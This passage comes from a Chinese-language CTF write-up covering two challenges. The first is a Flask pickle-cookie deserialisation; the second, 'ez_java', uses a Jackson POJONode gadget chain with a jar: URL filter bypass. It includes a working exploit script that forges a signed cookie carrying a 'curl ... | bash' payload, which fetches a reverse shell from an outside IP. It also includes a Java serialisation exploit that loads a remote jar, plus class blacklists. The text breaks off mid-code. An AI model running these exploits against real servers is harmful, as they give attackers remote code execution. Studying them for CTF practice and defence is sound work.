<span class="keyword">return</span> tob(<span class="string">&#x27;!&#x27;</span>) + sig + tob(<span class="string">&#x27;?&#x27;</span>) + msg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    data = tob(data)</span><br><span class="line">    <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">        sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">            <span class="keyword">return</span> pickle.loads(base64.b64decode(msg))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">data</span>):</span><br><span class="line">    blacklist = [<span class="string">b&#x27;R&#x27;</span>, <span class="string">b&#x27;secret&#x27;</span>, <span class="string">b&#x27;eval&#x27;</span>, <span class="string">b&#x27;file&#x27;</span>, <span class="string">b&#x27;compile&#x27;</span>, <span class="string">b&#x27;open&#x27;</span>, <span class="string">b&#x27;os.popen&#x27;</span>]</span><br><span class="line">    valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> data:</span><br><span class="line">            valid = <span class="literal">True</span></span><br><span class="line">            <span class="comment"># print(word)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_check</span>(<span class="params">key, secret=<span class="literal">None</span></span>):</span><br><span class="line">    a = request.cookies.get(key)</span><br><span class="line">    data = tob(request.cookies.get(key))</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="keyword">if</span> waf(res):</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tob</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.encode(enc) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, unicode) <span class="keyword">else</span> <span class="built_in">bytes</span>(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">key, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = request.cookies.get(key)</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookie_is_encoded</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(data.startswith(tob(<span class="string">&#x27;!&#x27;</span>)) <span class="keyword">and</span> tob(<span class="string">&#x27;?&#x27;</span>) <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_lscmp</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> <span class="built_in">sum</span>(<span class="number">0</span> <span class="keyword">if</span> x == y <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)) <span class="keyword">and</span> <span class="built_in">len</span>(a) == <span class="built_in">len</span>(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_cookie</span>(<span class="params">name, value, secret=<span class="literal">None</span>, **options</span>):</span><br><span class="line">    <span class="keyword">if</span> secret:</span><br><span class="line">        value = touni(cookie_encode((name, value), secret))</span><br><span class="line">        resp = make_response(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        resp.set_cookie(<span class="string">&quot;user&quot;</span>, value, max_age=<span class="number">3600</span>)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(value, basestring):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">4096</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Cookie value to long.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touni</span>(<span class="params">s, enc=<span class="string">&#x27;utf8&#x27;</span>, err=<span class="string">&#x27;strict&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">return</span> s.decode(enc, err) <span class="keyword">if</span> <span class="built_in">isinstance</span>(s, <span class="built_in">bytes</span>) <span class="keyword">else</span> unicode(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config&#x2F;secret_key.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret_code = <span class="string">&quot;EnjoyThePlayTime123456&quot;</span></span><br></pre></td></tr></table></figure><p>分析一下, 是一个简单的pickle反序列化, cookie处存在反序列化点, 这里没法直接弹shell, 所以在vps上起一个http服务放python的反弹shell, 然后curl下来推到bash即可</p><p>稍微改一下, 写一个伪造cookie的脚本</p><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config.secret_key <span class="keyword">import</span> secret_code</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request, render_template</span><br><span class="line"><span class="keyword">from</span> cookie <span class="keyword">import</span> set_cookie, cookie_check, touni, cookie_encode, cookie_decode, tob, cookie_is_encoded, _lscmp</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookie</span>(<span class="params">cookie,key=<span class="string">&#x27;user&#x27;</span>, default=<span class="literal">None</span>, secret=<span class="literal">None</span></span>):</span><br><span class="line">    value = cookie</span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">and</span> value:</span><br><span class="line">        dec = cookie_decode(value, secret)</span><br><span class="line">        <span class="keyword">return</span> dec[<span class="number">1</span>] <span class="keyword">if</span> dec <span class="keyword">and</span> dec[<span class="number">0</span>] == key <span class="keyword">else</span> default</span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">or</span> default</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;curl http://107.148.75.202:8000/pyshell.sh | bash&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> app.app_context():</span><br><span class="line">    code = opcode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br><span class="line">    res = code</span><br><span class="line">    cookie = touni(cookie_encode((<span class="string">&#x27;user&#x27;</span>, res), secret_code))</span><br><span class="line">    <span class="built_in">print</span>(cookie)</span><br><span class="line">    <span class="comment"># dec = cookie_decode(cookie, secret_code)</span></span><br><span class="line">    <span class="comment"># print(dec)</span></span><br><span class="line">    data_cookie = get_cookie(cookie, secret=secret_code)</span><br><span class="line"></span><br><span class="line">    data = tob(cookie)</span><br><span class="line">    <span class="keyword">if</span> data:</span><br><span class="line">        <span class="keyword">if</span> cookie_is_encoded(data):</span><br><span class="line">            sig, msg = data.split(tob(<span class="string">&#x27;?&#x27;</span>), <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">if</span> _lscmp(sig[<span class="number">1</span>:], base64.b64encode(hmac.new(tob(secret_code), msg, digestmod=hashlib.md5).digest())):</span><br><span class="line">                res = base64.b64decode(msg)</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(data_cookie, <span class="built_in">bytes</span>):</span><br><span class="line">        a = pickle.loads(data_cookie)</span><br></pre></td></tr></table></figure><h2 id="ez-java"><a href="#ez-java" class="headerlink" title="ez_java"></a>ez_java</h2><p>拿到jar包, 首先拿到账号密码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828125100773.png" alt="image-20240828125100773"></p><p>在UserController存在反序列化和文件上传, 有了账户密码才能访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: ycbjava-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/ycbjava/controler/UserControler.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserControler</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/user/index&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/ser&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">ser</span><span class="params">(<span class="meta">@RequestParam(&quot;ser&quot;)</span> String ser)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] decode = Base64.getDecoder().decode(ser);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        byteArrayOutputStream.write(decode);</span><br><span class="line">        <span class="type">MyObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/user/upload&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">handleFileUpload</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (file.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> fileName.lastIndexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;../&quot;</span>) || fileName.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> fileName.substring(index);</span><br><span class="line">            <span class="keyword">if</span> (suffix.equals(<span class="string">&quot;.jsp&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;/templates/&quot;</span> + fileName, <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line">            Files.write(path, bytes, <span class="keyword">new</span> <span class="title class_">OpenOption</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了下有shiro的依赖, 先是打了cb链, shiro反序列化,  无果</p><p>过滤了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] blacklist = &#123;<span class="string">&quot;java.lang.Runtime&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>, <span class="string">&quot;java.security.SignedObject&quot;</span>, <span class="string">&quot;com.sun.jndi.ldap.LdapAttribute&quot;</span>, <span class="string">&quot;org.apache.commons.beanutils&quot;</span>, <span class="string">&quot;org.apache.commons.collections&quot;</span>, <span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>, <span class="string">&quot;com.sun.org.apache.xpath.internal.objects.XString&quot;</span>&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试了utf-8 overlang bypass也不行</p><p>看来它禁掉的类是用不了了</p><p>在<code>com.example.ycbjava.bean.User#getGift</code>方法中向urlclasspath中添加数据, 结合之前的文件上传, 思路一下就有了:</p><blockquote><p>首先上传一个jar包, 然后触发getGift把&#x2F;templates&#x2F;下的jar包导入<code>urlclasspath</code>, 再次反序列化就能加载原本不存在的类</p></blockquote><p>getGift明显是一个getter, 但是禁的太多了, cb什么的都不能用, 没办法调用任意getter</p><p>思来想去我把目光放在了jackson上, 这里jackson版本2.13.5, 比较高, 之前没接触过jackson反序列化, 本来以为这是没什么链能用</p><p>抱着学习的态度看了下jackson反序列化, </p><p><code>POJONode</code>这个类的toString(父类实现)可以遍历调用getter, 那么问题就转化到调用toString了</p><p>唯一熟悉的<code>javax.management.BadAttributeValueExpException</code>调用toString被禁</p><p>找了很久直到看见这篇:</p><p><a href="https://www.aiwin.fun/index.php/archives/4420/">https://www.aiwin.fun/index.php/archives/4420/</a></p><p>搬过来直接用</p><p>插入urlclassspath的地方有一个小小的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240828130407747.png" alt="image-20240828130407747"></p><p>在http或file前面加上jar:即可绕过</p><p>例如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:file:/D:/tmp/123.jar!/</span><br></pre></td></tr></table></figure><p>末尾的<code>!/</code>是必不可少的</p><p>但是这题最坑的地方在于, 上传的jar包根本用不了(或许我的姿势不对), 所以我们使用<code>jar:http://</code>远程加载类</p><p>exp:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.ycbjava.bean.User;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.Test.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.Tools.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jacksonHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        CtClass ctClass= ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        CtMethod writeReplace=ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Evil</span> <span class="variable">evil</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Evil</span>();</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;jar:http://107.148.75.202:8000/123.jar!/&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">pojoNode2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(evil);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; innerClass=Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);</span><br><span class="line">        Map map1= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map2= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map3= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        Map map4= (HashMap) createWithoutConstructor(innerClass);</span><br><span class="line">        map3.put(pojoNode2,<span class="string">&quot;222&quot;</span>);</span><br><span class="line">        map4.put(pojoNode2,<span class="string">&quot;111&quot;</span>);<span class="comment">//pojoNode2中是原本不存在的恶意类, 先将pojoNode2放进去,保证执行了getGift再执行恶意类的toString方法, 否则加载不到恶意类</span></span><br><span class="line">        map1.put(pojoNode,<span class="string">&quot;444&quot;</span>);</span><br><span class="line">        map2.put(pojoNode,<span class="string">&quot;333&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map1,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field1=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(map2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field3=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map3,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field4=HashMap.class.getDeclaredField(<span class="string">&quot;loadFactor&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map4,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map3,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map4,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setHashMapValueToNull(map1, pojoNode);<span class="comment">//为了在HashMap.put时候就触发,通过反射变成null</span></span><br><span class="line">        setHashMapValueToNull(map2, pojoNode);</span><br><span class="line">        setHashMapValueToNull(map3, pojoNode2);</span><br><span class="line">        setHashMapValueToNull(map4, pojoNode2);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(hashMap);</span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; Object <span class="title function_">createWithoutConstructor</span> <span class="params">(Class classToInstantiate )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithoutConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T)sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setHashMapValueToNull</span><span class="params">(Map map, Object key)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tableField</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tableField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object node : table) &#123;</span><br><span class="line">            <span class="keyword">if</span> (node == <span class="literal">null</span>) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; nodeClass = node.getClass();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">            keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">k</span> <span class="operator">=</span> keyField.get(node);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (k != <span class="literal">null</span> &amp;&amp; k.equals(key)) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">valueField</span> <span class="operator">=</span> nodeClass.getDeclaredField(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">                valueField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                valueField.set(node, <span class="literal">null</span>);</span><br><span class="line">                <span 